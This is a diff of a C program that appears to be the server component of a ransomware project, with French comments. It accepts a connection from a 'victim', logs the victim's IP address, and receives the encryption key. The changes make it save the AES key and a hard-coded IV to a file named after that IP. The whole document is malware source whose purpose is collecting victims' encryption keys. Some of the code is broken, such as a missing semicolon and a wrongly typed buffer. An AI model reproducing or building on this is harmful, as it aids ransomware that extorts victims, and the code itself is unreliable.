@@ -13,7 +13,7 @@ void handle_error(){
     exit(0);
 }
 
-int main(void){
+int main(void) {
     int sockid;
     int server_port = 8888;
     char *server_ip = "127.0.0.1"
@@ -26,12 +26,11 @@ int main(void){
 
     char *buffer[BUFFER_SIZE];
     int n, client_socket;
-    int bind_result = bind(sockid, (const struct sockaddr *)&server_addr, sizeof(server_addr));
+    int bind_result = bind(sockid, (const struct sockaddr *) &server_addr, sizeof(server_addr));
 
-    if(bind_result<0){
+    if (bind_result < 0) {
         printf("Error during binding");
-    }
-    else {
+    } else {
         printf("server listening");
         n = listen(sockid, 1);
         if (n < 0) {
@@ -45,32 +44,43 @@ int main(void){
             printf("Error during accept");
             handle_error();
         }
-        printf("Accept connection from %s\n", inet_ntoa(client_addr.sin_addr)); //affichage de l'adresse ip de la victime
+        printf("Accept connection from %s\n",
+               inet_ntoa(client_addr.sin_addr)); //affichage de l'adresse ip de la victime
         n = recv(client_socket, (char *) buffer, BUFFER_SIZE, MSG_WAITALL);
         //reception et affichage de la clé de chiffrage
 
     }
     char *new_ip = inet_ntoa(client_addr.sin_addr);
-    char *key = (char *)buffer;
+    char *key = (char *) buffer;
     close(sockid);
-    
-    printf("key for the victim @ : %s  : %s", new_ip, key);
-    
-    int sockid2;
-    server_ip = new_ip;
+    char *iv = "jhdefdsqkldqsdklqsj";
 
-    sockid2 = socket(AF_INET, SOCK_STREAM,0);
+    FILE *file = fopen(new_ip, "w");
+    if (file == NULL) {
+        // Erreur lors de l'ouverture du fichier
+        printf("Error opening file!\n");
+        return 1;
+    }
 
-    struct sockaddr_in server_addr2;
-    server_addr2.sin_family = AF_INET;
-    server_addr2.sin_port = htons(server_port);
-    server_addr2.sin_addr.s_addr = inet_addr(new_ip);
+    // Écrit la clé AES 256 bits et l'IV 128 bits dans le fichier
+    if (fputs((char*)key, file) == EOF) {
+        // Erreur lors de l'écriture de la clé dans le fichier
+        printf("Error writing key to file!\n");
+        return 1;
+    }
+    if (fputs("\n", file) == EOF) {
+        // Erreur lors de l'écriture du retour à la ligne
+        printf("Error writing newline to file!\n");
+        return 1;
+    }
+    if (fputs((char*)iv, file) == EOF) {
+        // Erreur lors de l'écriture de l'IV dans le fichier
+        printf("Error writing IV to file!\n");
+        return 1;
+    }
 
-    char *msg = key;
+    // Ferme le fichier
+    fclose(file);
 
-    connect(sockid2,(struct sockaddr *)&server_addr2,sizeof(server_addr2));
-
-    send(sockid2,(const char *)msg,strlen(msg),0);
-    close(sockid2);
-    
+    return 0;
 }
